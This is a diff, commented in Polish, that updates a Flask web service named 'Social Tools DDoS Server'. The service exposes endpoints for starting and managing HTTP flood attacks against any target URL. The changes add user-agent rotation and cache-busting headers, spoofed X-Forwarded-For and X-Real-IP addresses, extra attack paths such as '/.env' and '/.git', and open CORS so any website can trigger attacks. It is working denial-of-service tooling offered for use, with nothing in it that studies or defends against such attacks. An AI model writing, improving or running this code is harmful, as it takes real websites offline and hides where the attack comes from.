@@ -21,8 +21,8 @@ logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
 
-# ==== POPRAWIONA KONFIGURACJA CORS ====
-CORS(app, origins="*", supports_credentials=True)
+# ==== POPRAWIONA KONFIGURACJA CORS - OBSŁUGA PREFLIGHT ====
+CORS(app, origins="*", supports_credentials=True, allow_headers=["Content-Type", "Authorization", "X-Requested-With"])
 
 # Dodatkowe nagłówki CORS dla pewności
 @app.after_request
@@ -31,6 +31,7 @@ def after_request(response):
     response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization,X-Requested-With')
     response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
     response.headers.add('Access-Control-Allow-Credentials', 'true')
+    response.headers.add('Access-Control-Max-Age', '86400')  # Cache preflight na 24h
     return response
 
 # ==== GLOBALNE ZMIENNE DLA ATAKÓW ====
@@ -93,11 +94,15 @@ def website_killer_attack(target_url, threads_count=200, attack_id=None):
         'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
         'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
         'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
+        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36',
+        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
+        'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14',
     ]
     
     # Lista ścieżek do ataku (oprócz głównej)
     paths = ['/', '/index.html', '/index.php', '/wp-admin', '/wp-login.php', 
-             '/admin', '/login', '/api', '/api/v1', '/graphql', '/xmlrpc.php']
+             '/admin', '/login', '/api', '/api/v1', '/graphql', '/xmlrpc.php',
+             '/.env', '/.git', '/backup', '/backups', '/old', '/test']
     
     def flood_http():
         """Wątek ataku przez HTTP/HTTPS (requests)"""
@@ -119,11 +124,12 @@ def website_killer_attack(target_url, threads_count=200, attack_id=None):
                 headers = {
                     'User-Agent': random.choice(user_agents),
                     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                    'Accept-Language': random.choice(['pl-PL,pl;q=0.9', 'en-US,en;q=0.9']),
+                    'Accept-Language': random.choice(['pl-PL,pl;q=0.9', 'en-US,en;q=0.9', 'pl;q=0.9']),
                     'Connection': 'keep-alive',
-                    'Cache-Control': 'no-cache',
+                    'Cache-Control': 'no-cache, no-store, must-revalidate',
                     'Pragma': 'no-cache',
                     'Upgrade-Insecure-Requests': '1',
+                    'DNT': '1',
                 }
                 
                 # Wykonaj zapytanie - nie czekamy na odpowiedź
@@ -134,6 +140,8 @@ def website_killer_attack(target_url, threads_count=200, attack_id=None):
             except requests.exceptions.Timeout:
                 attack_stats[attack_id]["requests"] += 1
             except requests.exceptions.ConnectionError:
+                attack_stats[attack_id]["requests"] += 1
+            except requests.exceptions.ChunkedEncodingError:
                 attack_stats[attack_id]["requests"] += 1
             except Exception:
                 attack_stats[attack_id]["requests"] += 1
@@ -161,12 +169,17 @@ def website_killer_attack(target_url, threads_count=200, attack_id=None):
                 else:
                     request_line = f"GET {path} HTTP/1.1\r\n"
                 
+                # Dodaj losowy nagłówek X-Forwarded-For (spoofing IP)
+                random_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+                
                 headers = (
                     f"Host: {host}\r\n"
                     f"User-Agent: {random.choice(user_agents)}\r\n"
                     f"Accept: */*\r\n"
+                    f"Accept-Language: pl-PL,pl;q=0.9\r\n"
                     f"Connection: close\r\n"
-                    f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
+                    f"X-Forwarded-For: {random_ip}\r\n"
+                    f"X-Real-IP: {random_ip}\r\n"
                     f"\r\n"
                 )
                 
@@ -210,11 +223,13 @@ def website_killer_attack(target_url, threads_count=200, attack_id=None):
     
     return attack_id
 
-# ==== ENDPOINTY API ====
+# ==== ENDPOINTY API Z PEŁNĄ OBSŁUGĄ OPTIONS ====
 
 @app.route('/api/status', methods=['GET', 'OPTIONS'])
 def status():
     """Status serwera DDoS"""
+    if request.method == 'OPTIONS':
+        return handle_preflight()
     return jsonify({
         "success": True,
         "status": "online",
@@ -225,6 +240,9 @@ def status():
 @app.route('/api/attack/start', methods=['POST', 'OPTIONS'])
 def start_attack():
     """Rozpoczyna agresywny atak DDoS"""
+    if request.method == 'OPTIONS':
+        return handle_preflight()
+    
     try:
         data = request.get_json()
         if not data:
@@ -258,6 +276,9 @@ def start_attack():
 @app.route('/api/attack/stop/<attack_id>', methods=['POST', 'OPTIONS'])
 def stop_attack(attack_id):
     """Zatrzymuje atak"""
+    if request.method == 'OPTIONS':
+        return handle_preflight()
+    
     try:
         if attack_id in attack_stop_flags:
             attack_stop_flags[attack_id] = True
@@ -276,6 +297,9 @@ def stop_attack(attack_id):
 @app.route('/api/attack/status/<attack_id>', methods=['GET', 'OPTIONS'])
 def attack_status(attack_id):
     """Status konkretnego ataku"""
+    if request.method == 'OPTIONS':
+        return handle_preflight()
+    
     try:
         if attack_id in attack_stats:
             stats = attack_stats[attack_id]
@@ -299,6 +323,9 @@ def attack_status(attack_id):
 @app.route('/api/attacks', methods=['GET', 'OPTIONS'])
 def list_attacks():
     """Lista aktywnych ataków"""
+    if request.method == 'OPTIONS':
+        return handle_preflight()
+    
     attacks_list = []
     
     for attack_id in active_attacks:
@@ -324,6 +351,8 @@ def list_attacks():
 @app.route('/', methods=['GET', 'OPTIONS'])
 def index():
     """Strona główna serwera DDoS"""
+    if request.method == 'OPTIONS':
+        return handle_preflight()
     return jsonify({
         "name": "Social Tools DDoS Server",
         "version": "2.0",
@@ -336,6 +365,17 @@ def index():
             "GET /api/attacks": "Lista aktywnych ataków"
         }
     })
+
+# ==== FUNKCJA POMOCNICZA DLA PREFLIGHT ====
+def handle_preflight():
+    """Obsługuje zapytania OPTIONS (preflight) dla CORS"""
+    response = jsonify({'success': True})
+    response.headers.add('Access-Control-Allow-Origin', '*')
+    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization,X-Requested-With')
+    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
+    response.headers.add('Access-Control-Allow-Credentials', 'true')
+    response.headers.add('Access-Control-Max-Age', '86400')
+    return response, 200
 
 # ==== Czyszczenie starych ataków ====
 def cleanup_old_attacks():
@@ -374,6 +414,7 @@ if __name__ == "__main__":
     ║  • Do 500 wątków jednocześnie                              ║
     ║  • Rotacja User-Agent i cache busting                      ║
     ║  • Atak na wiele ścieżek jednocześnie                      ║
+    ║  • Pełna obsługa CORS i preflight requests                 ║
     ╚════════════════════════════════════════════════════════════╝
     """)
     
@@ -384,6 +425,6 @@ if __name__ == "__main__":
     print(f"🚀 Serwer DDoS uruchomiony na porcie {port}")
     print(f"📡 Endpoint: http://localhost:{port}/api/attack/start")
     print(f"🌐 Publiczny adres: https://social-tools-ddos.onrender.com")
-    print(f"🔓 CORS: Zezwolono na wszystkie domeny")
+    print(f"🔓 CORS: Zezwolono na wszystkie domeny z pełną obsługą preflight")
     
     app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
